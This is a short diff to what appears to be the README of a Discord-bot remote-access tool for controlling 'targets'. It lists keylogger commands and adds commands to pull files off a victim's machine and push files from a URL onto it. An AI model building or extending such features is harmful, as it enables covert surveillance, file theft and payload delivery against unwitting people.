@@ -17,4 +17,6 @@ PYcord featuring multiple cool commands you can use to control your targets, inc
 .keylog_start to start keylogger
 .keylog_read to read keylogger
 .keylog_stop to stop keylogger
+.download <file> to make file from target into downloadable link
+.upload <url\file> to make file from a url uploaded into target
 ```
